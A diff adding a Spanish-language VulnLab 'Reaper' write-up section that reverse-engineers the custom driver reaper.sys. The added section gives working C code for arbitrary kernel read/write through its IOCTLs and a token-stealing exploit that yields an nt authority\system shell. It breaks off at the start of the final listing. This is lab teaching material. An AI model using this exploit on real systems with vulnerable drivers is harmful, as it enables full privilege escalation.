@@ -132,7 +132,7 @@
       <ul>
         <li><a href="#enumeration">Enumeración</a></li>
         <li><a href="#shell-keysvc">Shell - keysvc</a></li>
-        <!--<li><a href="#shell-system">Shell - system</a></li>-->
+        <li><a href="#shell-system">Shell - system</a></li>
     </ul>
   </div>
 
@@ -443,7 +443,7 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">"key: "</spa
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Exit</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
 shell.recvuntil(</span><span class="no">b</span><span class="s">"Checking key: "</span><span class="p">)
 
-binary_base </span><span class="o">= </span><span class="no">int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x20660</span><span class="p">
+binary_base </span><span class="o">= </span><span class="na">int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x20660</span><span class="p">
 log.info(</span><span class="no">f</span><span class="s">"Binary base: </span><span class="p">{</span><span class="no">hex</span><span class="p">(binary_base)}</span><span class="s">"</span><span class="p">)
 
 shell.interactive()</span>
@@ -649,7 +649,7 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">"key: "</spa
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Exit</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
 shell.recvuntil(</span><span class="no">b</span><span class="s">"Checking key: "</span><span class="p">)
 
-binary_base </span><span class="o">= </span><span class="no">int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x20660</span><span class="p">
+binary_base </span><span class="o">= </span><span class="na">int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x20660</span><span class="p">
 
 offset</span><span class="o"> =</span><span class="mi"> 88</span><span class="p">
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
@@ -850,7 +850,7 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">"key: "</spa
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"Exit</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
 shell.recvuntil(</span><span class="no">b</span><span class="s">"Checking key: "</span><span class="p">)
 
-binary_base </span><span class="o">= </span><span class="no">int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x20660</span><span class="p">
+binary_base </span><span class="o">= </span><span class="na">int</span><span class="p">(shell.recvline().strip(),</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x20660</span><span class="p">
 
 offset</span><span class="o"> =</span><span class="mi"> 88</span><span class="p">
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
@@ -956,6 +956,451 @@ Microsoft Windows [Version 10.0.19045.3208]
 C:\> </span><span class="am">whoami</span><span class="p">
 reaper\keysvc
 C:\></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-system">
+<br><h3 class="post-title">Shell - system</h3><br>
+
+<p class="plain-text">En el directorio <code class="language-plaintext highlighter-rouge">C:\driver</code> podemos encontrar un archivo llamado <code class="language-plaintext highlighter-rouge">reaper.sys</code> que probablemente es un driver personalizado corriendo dentro de la máquina</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\driver></span><span class="am"> dir</span><span class="p">
+
+    Directory: C:\driver
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         7/27/2023   9:12 AM           8432 reaper.sys  
+
+PS C:\driver></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Abrimos el driver en <code class="language-plaintext highlighter-rouge">IDA</code>, la función <code class="language-plaintext highlighter-rouge">DriverEntry</code> inicia llamando a 2 funciones sin simbolos, la primera solo comprueba una cookie asi que vamos con la segunda</p>
+<a href="/vulnlab/reaper/23.png" target="_blank"><div><p><img src="/vulnlab/reaper/23.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">sub_11c8</code> inicia llamando a <code class="language-plaintext highlighter-rouge">RtlGetVersion</code> que se utiliza para obtener información sobre el sistema operativo que se está ejecutando actualmente</p>
+<a href="/vulnlab/reaper/24.png" target="_blank"><div><p><img src="/vulnlab/reaper/24.png"></p></div></a>
+
+<p class="plain-text">La interfaz con la que podemos comunicarnos con el driver son las llamadas <code class="language-plaintext highlighter-rouge">ioctl</code>, al instalar un driver utilizando la función <code class="language-plaintext highlighter-rouge">IoCreateDevice</code> se establece un nombre de dispositivo, en el siguiente bloque podemos ver que se establece a <code class="language-plaintext highlighter-rouge">\\\\.\\Reaper</code></p>
+<a href="/vulnlab/reaper/25.png" target="_blank"><div><p><img src="/vulnlab/reaper/25.png"></p></div></a>
+
+<p class="plain-text">Cada función se identifica con un código <code class="language-plaintext highlighter-rouge">ioctl</code>, el driver acepta este tipo de llamadas usando estructuras de tipo <code class="language-plaintext highlighter-rouge">IRP</code> o <code class="language-plaintext highlighter-rouge">I/O Request Packets</code>, en este bloque podemos ver que la función establecida para encargarse de esta tarea es <code class="language-plaintext highlighter-rouge">sub_1020</code>, esta inicia haciendo comparaciones de varios códigos ioctl con sus saltos condicionales</p>
+<a href="/vulnlab/reaper/26.png" target="_blank"><div><p><img src="/vulnlab/reaper/26.png"></p></div></a>
+
+<p class="plain-text">Si el código ioctl es <code class="language-plaintext highlighter-rouge">0x80002003</code> realiza una comparación de un valor <code class="language-plaintext highlighter-rouge">Magic</code> con el dword <code class="language-plaintext highlighter-rouge">0x6a55cc9e</code>, si se cumple llama <code class="language-plaintext highlighter-rouge">ExAllocatePoolWithTag</code> que asigna un espacio en memoria del tipo <code class="language-plaintext highlighter-rouge">NonPagedPool</code> con un tamaño total de <code class="language-plaintext highlighter-rouge">0x20</code> y el tag <code class="language-plaintext highlighter-rouge">paeR</code></p>
+<a href="/vulnlab/reaper/27.png" target="_blank"><div><p><img src="/vulnlab/reaper/27.png"></p></div></a>
+
+<p class="plain-text">Luego de ello crea una estructura <code class="language-plaintext highlighter-rouge">ReaperData</code> con valores en diferentes offsets, el primero de ellos es el valor <code class="language-plaintext highlighter-rouge">Magic</code> que tenemos que cumplir, algunos otros valores interesantes son unas direcciones <code class="language-plaintext highlighter-rouge">Src</code> y <code class="language-plaintext highlighter-rouge">Dst</code> las cuales nos servirán mas adelante</p>
+<a href="/vulnlab/reaper/28.png" target="_blank"><div><p><img src="/vulnlab/reaper/28.png"></p></div></a>
+
+<p class="plain-text">Podemos definirlo en <code class="language-plaintext highlighter-rouge">C</code> como una estructura donde los primeros <code class="language-plaintext highlighter-rouge">3</code> valores son <code class="language-plaintext highlighter-rouge">dwords</code>, luego un <code class="language-plaintext highlighter-rouge">dword</code> sin usar y finalmente <code class="language-plaintext highlighter-rouge">2</code> direcciones de tamaño <code class="language-plaintext highlighter-rouge">qwords</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">typedef struct</span><span class="p"> ReaperData {  
+    </span><span class="na">DWORD</span><span class="p"> Magic;
+    </span><span class="na">DWORD</span><span class="p"> ThreadId;
+    </span><span class="na">DWORD</span><span class="p"> Priority;
+    </span><span class="na">DWORD</span><span class="p"> Empty;
+    </span><span class="na">QWORD</span><span class="p"> SrcAddress;
+    </span><span class="na">QWORD</span><span class="p"> DstAddress;
+} </span><span class="na">ReaperData</span><span class="p">;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si el código ioctl es igual a <code class="language-plaintext highlighter-rouge">0x80002007</code> llama a la función <code class="language-plaintext highlighter-rouge">ExFreePoolWithTag</code> que libera el bloque de memoria del <code class="language-plaintext highlighter-rouge">pool</code> que se asigno con el tag anteriormente</p>
+<a href="/vulnlab/reaper/31.png" target="_blank"><div><p><img src="/vulnlab/reaper/31.png"></p></div></a>
+
+<p class="plain-text">El código <code class="language-plaintext highlighter-rouge">0x8000200b</code> llama a <code class="language-plaintext highlighter-rouge">PsLookupThreadByThreadId</code> acepta el id de un hilo y devuelve el puntero a la estructura <code class="language-plaintext highlighter-rouge">ETHREAD</code>, luego llama a <code class="language-plaintext highlighter-rouge">KeSetPriorityThread</code> establece la prioridad de tiempo de ejecución del hilo creado, finalmente llama a la función <code class="language-plaintext highlighter-rouge">ObDeferenceObject</code> disminuye el numero de referencias al objeto dado</p>
+<a href="/vulnlab/reaper/29.png" target="_blank"><div><p><img src="/vulnlab/reaper/29.png"></p></div></a>
+
+<p class="plain-text">Luego de mover a <code class="language-plaintext highlighter-rouge">rcx</code> el <code class="language-plaintext highlighter-rouge">Dst</code> y a <code class="language-plaintext highlighter-rouge">rax</code> el <code class="language-plaintext highlighter-rouge">Src</code> de la estructura que se creó con la asignación ejecuta un bloque que mueve el contenido de la dirección <code class="language-plaintext highlighter-rouge">Src</code> a <code class="language-plaintext highlighter-rouge">Dst</code></p>
+<a href="/vulnlab/reaper/30.png" target="_blank"><div><p><img src="/vulnlab/reaper/30.png"></p></div></a>
+
+<p class="plain-text">Entonces, tenemos <code class="language-plaintext highlighter-rouge">3</code> códigos ioctl, el primero asigna un espacio en memoria, el segundo la libera y el tercera copia el contenido de una fuente a un destino</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">#define</span><span class="na"> IOCTL_ALLOC</span><span class="mi"> 0x80002003  
+</span><span class="o">#define</span><span class="na"> IOCTL_FREE</span><span class="mi">  0x80002007  
+</span><span class="o">#define</span><span class="na"> IOCTL_COPY</span><span class="mi">  0x8000200b  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos escribir las funciones de la siguiente forma, todas llaman a <code class="language-plaintext highlighter-rouge">DeviceIoControl</code> para comunicarse con el driver, la función <code class="language-plaintext highlighter-rouge">Alloc</code> manda como entrada una estructura <code class="language-plaintext highlighter-rouge">userData</code>, las funciones <code class="language-plaintext highlighter-rouge">Free</code> y <code class="language-plaintext highlighter-rouge">Copy</code> simplemente llaman a sus códigos <code class="language-plaintext highlighter-rouge">ioctl</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="na">VOID </span><span class="na">Alloc</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">, ReaperData </span><span class="o">*</span><span class="ra">userData</span><span class="p">) {
+    </span><span class="na">UCHAR</span><span class="p"> output[</span><span class="mi">1024</span><span class="p">];
+    </span><span class="na">ULONG</span><span class="p"> bytes;
+
+    ZeroMemory(output, </span><span class="o">sizeof</span><span class="p">(output));
+    DeviceIoControl(hDevice, IOCTL_ALLOC,(</span><span class="na">LPVOID</span><span class="p">) userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> ReaperData), output, </span><span class="mi">1024</span><span class="p">, </span><span class="o">&</span><span class="p">bytes, </span><span class="mi">NULL</span><span class="p">);  
+}
+
+</span><span class="na">VOID Free</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">) {
+    </span><span class="na">UCHAR</span><span class="p"> output[</span><span class="mi">1024</span><span class="p">];
+    </span><span class="na">ULONG</span><span class="p"> bytes;
+
+    ZeroMemory(output, </span><span class="o">sizeof</span><span class="p">(output));
+    DeviceIoControl(hDevice, IOCTL_FREE, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="mi">NULL</span><span class="p">, (</span><span class="no">DWORD</span><span class="p">) </span><span class="mi">0</span><span class="p">, output,</span><span class="mi"> 1024</span><span class="p">,</span><span class="o"> &</span><span class="p">bytes,</span><span class="mi"> NULL</span><span class="p">);
+}
+
+</span><span class="na">VOID Copy</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">) {
+    </span><span class="na">UCHAR</span><span class="p"> output[</span><span class="mi">1024</span><span class="p">];
+    </span><span class="na">ULONG</span><span class="p"> bytes;
+
+    ZeroMemory(output,</span><span class="o"> sizeof</span><span class="p">(output));
+    DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="no">LPVOID</span><span class="p">)</span><span class="mi"> NULL</span><span class="p">, (</span><span class="na">DWORD</span><span class="p">)</span><span class="mi"> 0</span><span class="p">, output, </span><span class="mi">1024</span><span class="p">, </span><span class="o">&</span><span class="p">bytes, </span><span class="mi">NULL</span><span class="p">);
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">ArbitraryWrite</code> nos permite escribir un <code class="language-plaintext highlighter-rouge">qword</code>, el primer valor es <code class="language-plaintext highlighter-rouge">Magic</code> que necesitamos para cumplir la condición, a <code class="language-plaintext highlighter-rouge">ThreadId</code> le pasamos el id actual, el <code class="language-plaintext highlighter-rouge">Priority</code> podemos establecerlo a <code class="language-plaintext highlighter-rouge">0</code> y los ultimos valores son la dirección de fuente y de destino, entonces llamamos a la función <code class="language-plaintext highlighter-rouge">Alloc</code> para establecer la estructura, luego a <code class="language-plaintext highlighter-rouge">Copy</code> que escribe el <code class="language-plaintext highlighter-rouge">qword</code> y libera el bloque llamando a la función <code class="language-plaintext highlighter-rouge">Free</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="na">VOID ArbitraryWrite</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> src</span><span class="p">, </span><span class="na">QWORD</span><span class="ra"> dest</span><span class="p">) {  
+    ReaperData userData;
+
+    userData.Magic</span><span class="o"> =</span><span class="mi"> 0x6a55cc9e</span><span class="p">;
+    userData.ThreadId</span><span class="o"> =</span><span class="p"> GetCurrentThreadId();
+    userData.Priority </span><span class="o">=</span><span class="mi"> 0</span><span class="p">;
+    userData.SrcAddress </span><span class="o">= </span><span class="p">src;
+    userData.DstAddress </span><span class="o">=</span><span class="p"> dest;
+
+    Alloc(hDevice, </span><span class="o">&</span><span class="p">userData);
+    Copy(hDevice);
+    Free(hDevice);
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">ArbitraryRead</code> es parecida pero solo recibe como argumento donde queremos leer, como destino de <code class="language-plaintext highlighter-rouge">Copy</code> establecemos la referencia a un <code class="language-plaintext highlighter-rouge">qword</code> llamado <code class="language-plaintext highlighter-rouge">output</code> que es el valor que se retorna luego de llamar a las funciones</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="na">QWORD ArbitraryRead</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> where</span><span class="p">) {  
+    </span><span class="na">QWORD</span><span class="p"> output;
+    ReaperData userData;
+
+    userData.Magic</span><span class="p"> = </span><span class="mi">0x6a55cc9e</span><span class="p">;
+    userData.ThreadId</span><span class="o"> =</span><span class="p"> GetCurrentThreadId();
+    userData.Priority </span><span class="o">=</span><span class="mi"> 0</span><span class="p">;
+    userData.SrcAddress </span><span class="o">= </span><span class="p">where;
+    userData.DstAddress </span><span class="o">= </span><span class="p">(</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">output;
+
+    Alloc(hDevice,</span><span class="o"> &</span><span class="p">userData);
+    Copy(hDevice);
+    Free(hDevice);
+
+    </span><span class="o">return</span><span class="p"> output;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En la máquina que se va a depurar habilitaremos el modo debug y en los ajustes haremos que se conecte al debugger por el puerto <code class="language-plaintext highlighter-rouge">50000</code> con la key <code class="language-plaintext highlighter-rouge">1.1.1.1</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">C:\Windows\system32></span><span class="am"> bcdedit</span><span class="p"> /debug on
+The operation completed successfully.
+
+C:\Windows\system32></span><span class="am"> bcdedit</span><span class="p"> /dbgsettings net hostip:192.168.100.5 port:50000 key:1.1.1.1
+Key=1.1.1.1
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En la máquina debugger ejecutaremos WinDbg y en la pestaña <code class="language-plaintext highlighter-rouge">Attach to kernel</code>, añadimos el puerto y la key que especificamos antes en la máquina a depurar</p>
+<a href="/vulnlab/reaper/32.png" target="_blank"><div><p><img src="/vulnlab/reaper/32.png"></p></div></a>
+
+<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">sc</code> podemos iniciar el driver <code class="language-plaintext highlighter-rouge">reaper.sys</code> como un servicio en el kernel</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">C:\driver> </span><span class="am">sc</span><span class="p"> create Reaper binPath=C:\driver\reaper.sys type=kernel
+[SC] CreateService SUCCESS
+
+C:\driver> </span><span class="am">sc</span><span class="p"> config Reaper start=system
+[SC] ChangeServiceConfig SUCCESS
+
+C:\driver> </span><span class="am">sc</span><span class="p"> start Reaper
+
+SERVICE_NAME: Reaper
+        TYPE               : 1  KERNEL_DRIVER
+        STATE              : 4  RUNNING
+                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)  
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+        PID                : 0
+        FLAGS              :
+
+C:\driver></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente solo necesitamos reiniciar la máquina a depurar y automáticamente se conectara al debugger, podemos ejecutar <code class="language-plaintext highlighter-rouge">g</code> para dejar que arranque con normalidad</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Connected to target 192.168.100.10 on port 50000 on local IP 192.168.100.5.
+You can get the target MAC address by running .kdtargetmac command.
+Kernel Debugger connection established.  (Initial Breakpoint requested)
+
+************* Path validation summary **************
+Response                         Time (ms)     Location
+Deferred                                       SRV*c:\symbols*http://msdl.microsoft.com/download/symbols  
+Symbol search path is: SRV*c:\symbols*http://msdl.microsoft.com/download/symbols
+Executable search path is:
+Windows 10 Kernel Version 19045 MP (2 procs) Free x64
+Kernel base = 0xfffff800`56000000 PsLoadedModuleList = 0xfffff800`56c33a50
+Break instruction exception - code 80000003 (first chance)
+nt!DbgBreakPointWithStatus:
+fffff800`56420b10 cc              int     3
+
+</span><span class="ro">0: kd></span><span class="p"> g</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos comprobar que se cargó listando el módulo <code class="language-plaintext highlighter-rouge">reaper</code> desde el debugger</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0: kd></span><span class="p"> lm m reaper
+Browse full module list
+start             end                 module name
+fffff800`64790000 fffff800`64797000   reaper     (deferred)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En windows existe un proceso llamado <code class="language-plaintext highlighter-rouge">SYSTEM</code> al cual le pertenece el pid <code class="language-plaintext highlighter-rouge">4</code>, este alberga la mayoria de subprocesos del sistema en modo kernel, dado que alberga la ejecución del código en modo kernel que está en un contexto de altos privilegios</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0: kd> </span><span class="p">!process 0 0 System
+PROCESS ffffba09b847a040
+    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
+    DirBase: 001ae000  ObjectTable: ffffe0006c085000  HandleCount: 1993.  
+    Image: System</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La dirección que nos otorga el primer resultado es la de la estructura <code class="language-plaintext highlighter-rouge">_EPROCESS</code> de <code class="language-plaintext highlighter-rouge">SYSTEM</code>, entre los atributos de la estructura en el offset <code class="language-plaintext highlighter-rouge">0x4b8</code> encontramos lo primero interesante para nuestro shellcode, esto es el campo <code class="language-plaintext highlighter-rouge">Token</code> del proceso</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0: kd></span><span class="p"> dt nt!_EPROCESS 0xffffba09b847a040 Token
+   +0x4b8 Token : _EX_FAST_REF
+
+</span><span class="ro">0: kd></span><span class="p"> dt nt!_EX_FAST_REF 0xffffba09b847a040 + 0x4b8
+   +0x000 Object           : 0xffffe000`6c04c045 Void  
+   +0x000 RefCnt           : 0y0101
+   +0x000 Value            : 0xffffe000`6c04c045</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Otros campos bastante interesantes son <code class="language-plaintext highlighter-rouge">UniqueProcessId</code> en el offset <code class="language-plaintext highlighter-rouge">0x440</code> que guarda el pid del proceso y el campo <code class="language-plaintext highlighter-rouge">ActiveProcessLinks</code> en el offset <code class="language-plaintext highlighter-rouge">0x448</code> que es una estructura doblemente enlazada que apunta al <code class="language-plaintext highlighter-rouge">_EPROCESS</code> del siguiente proceso</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0: kd></span><span class="p"> dt nt!_EPROCESS 0xffffba09b847a040 UniqueProcessId
+   +0x440 UniqueProcessId : 0x00000000`00000004 Void
+
+</span><span class="ro">0: kd></span><span class="p"> dt nt!_EPROCESS 0xffffba09b847a040 ActiveProcessLinks
+   +0x448 ActiveProcessLinks : _LIST_ENTRY [ 0xffffba09`b855d4c8 - 0xfffff807`66c26360 ]  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Los offsets de la estructura pueden cambiar en las diferentes versiones de windows, para la versión especifica que corre la máquina victima tenemos estos offsets</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">#define</span><span class="na"> OFFSET_Token</span><span class="mi"> 0x4b8
+</span><span class="o">#define</span><span class="na"> OFFSET_UniqueProcessId</span><span class="mi"> 0X440
+</span><span class="o">#define</span><span class="na"> OFFSET_ActiveProcessLinks</span><span class="mi"> 0x448  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">GetKernelBase</code> obtiene la dirección base del kernel con <code class="language-plaintext highlighter-rouge">EnumDeviceDrivers</code>, la función <code class="language-plaintext highlighter-rouge">GetSystemEProcess</code> carga el binario <code class="language-plaintext highlighter-rouge">ntoskrnl.exe</code>, luego obtiene la dirección relativa al bloque de datos del proceso de <code class="language-plaintext highlighter-rouge">System</code>, finalmente calcula la dirección sumando el offset a la dirección base del kernel y lee el <code class="language-plaintext highlighter-rouge">_EPROCESS</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="na">QWORD</span><span class="p"> GetKernelBase() {
+    </span><span class="na">LPVOID</span><span class="p"> drivers[</span><span class="mi">1024</span><span class="p">];
+    </span><span class="na">DWORD</span><span class="p"> cbNeeded;
+    EnumDeviceDrivers(drivers, </span><span class="o">sizeof</span><span class="p">(drivers),</span><span class="o"> &</span><span class="p">cbNeeded);
+
+    </span><span class="o">return</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) drivers[</span><span class="mi">0</span><span class="p">];
+}
+
+</span><span class="na">QWORD GetSystemEProcess</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> kernelBase</span><span class="p">) {
+    </span><span class="na">HMODULE</span><span class="p"> hKernel </span><span class="o">= </span><span class="p">LoadLibraryA(</span><span class="s">"C:</span><span class="mi">\\</span><span class="s">Windows</span><span class="mi">\\</span><span class="s">System32</span><span class="mi">\\</span><span class="s">ntoskrnl.exe"</span><span class="p">);
+    </span><span class="na">HANDLE</span><span class="p"> psInitialProcess</span><span class="o"> =</span><span class="p"> GetProcAddress(hKernel, </span><span class="s">"PsInitialSystemProcess"</span><span class="p">);  
+
+    </span><span class="na">QWORD</span><span class="p"> psOffset</span><span class="o"> =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) psInitialProcess</span><span class="o"> -</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) hKernel;
+    </span><span class="na">QWORD</span><span class="p"> psAddress</span><span class="o"> =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="p"> psOffset;
+
+    </span><span class="na">QWORD</span><span class="p"> systemEProcess </span><span class="o">=</span><span class="p"> ArbitraryRead(hDevice, psAddress);
+    FreeLibrary(hKernel);
+
+    </span><span class="o">return</span><span class="p"> systemEProcess;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La funcion <code class="language-plaintext highlighter-rouge">GetCurrentEProcess</code> recibe como argumento el <code class="language-plaintext highlighter-rouge">systemEProcess</code> y a partir de ahi en bucle recorre la lista doblemente enlazada <code class="language-plaintext highlighter-rouge">ActiveProcessLinks</code>, compara si el pid del <code class="language-plaintext highlighter-rouge">_EPROCESS</code> es igual al del proceso actual y si es asi retorna la dirección</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="na">QWORD GetCurrentEProcess</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> systemEProcess</span><span class="p">) {
+    </span><span class="na">QWORD</span><span class="p"> currentEProcess</span><span class="o"> =</span><span class="p"> systemEProcess;
+    </span><span class="na">DWORD</span><span class="p"> currentProcessId</span><span class="o"> =</span><span class="p"> GetCurrentProcessId();
+
+    </span><span class="o">while</span><span class="p"> (</span><span class="mi">TRUE</span><span class="p">) {
+        </span><span class="na">QWORD</span><span class="p"> processLinkAddress</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, currentEProcess </span><span class="o">+ </span><span class="p">OFFSET_ActiveProcessLinks);
+        </span><span class="na">QWORD</span><span class="p"> processId</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, processLinkAddress</span><span class="o"> -</span><span class="p"> OFFSET_ActiveProcessLinks </span><span class="o">+</span><span class="p"> OFFSET_UniqueProcessId);
+
+        currentEProcess</span><span class="o"> =</span><span class="p"> processLinkAddress</span><span class="o"> -</span><span class="p"> OFFSET_ActiveProcessLinks;
+
+        </span><span class="o">if</span><span class="p"> ((</span><span class="na">DWORD</span><span class="p">) processId</span><span class="o"> ==</span><span class="p"> currentProcessId) {
+            </span><span class="o">break</span><span class="p">;
+        }
+    }
+
+    </span><span class="o">return</span><span class="p"> currentEProcess;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">main</code> explota un <a href="/exploit-development/windows-kernel/token-stealing">Token Stealing</a>, obtiene las direcciones de la estructura <code class="language-plaintext highlighter-rouge">_EPROCESS</code> del proceso de <code class="language-plaintext highlighter-rouge">System</code> y la del proceso actual, luego escribe en la dirección del campo <code class="language-plaintext highlighter-rouge">Token</code> del proceso actual el campo <code class="language-plaintext highlighter-rouge">Token</code> del proceso System</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">int</span><span class="na"> main</span><span class="p">() {
+    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">Reaper"</span><span class="p">, GENERIC_READ </span><span class="o">| </span><span class="p">GENERIC_WRITE,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);  
+
+    </span><span class="o">if</span><span class="p"> (hDevice </span><span class="o">==</span><span class="p"> INVALID_HANDLE_VALUE) {
+        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
+        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
+    }
+
+    </span><span class="na">QWORD</span><span class="p"> systemEProcess</span><span class="o"> =</span><span class="p"> GetSystemEProcess(hDevice, GetKernelBase());
+    </span><span class="na">QWORD</span><span class="p"> currentEProcess</span><span class="o"> =</span><span class="p"> GetCurrentEProcess(hDevice, systemEProcess);
+
+    ArbitraryWrite(hDevice, systemEProcess </span><span class="o">+</span><span class="p"> OFFSET_Token, currentEProcess </span><span class="o">+ </span><span class="p">OFFSET_Token);
+    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
+
+    CloseHandle(hDevice);
+    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces, nuestro exploit a través de las funciones de los códigos <code class="language-plaintext highlighter-rouge">ioctl</code> escribe el <code class="language-plaintext highlighter-rouge">Token</code> del proceso <code class="language-plaintext highlighter-rouge">System</code> en el proceso actual, luego ejecuta <code class="language-plaintext highlighter-rouge">system("cmd.exe")</code> que al ejecutarlo nos devuelve una shell como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">#include</span><span class="s"> &ltwindows.h>
+</span><span class="o">#include</span><span class="s"> &ltstdio.h>
+</span><span class="o">#include</span><span class="s"> &ltpsapi.h>
+
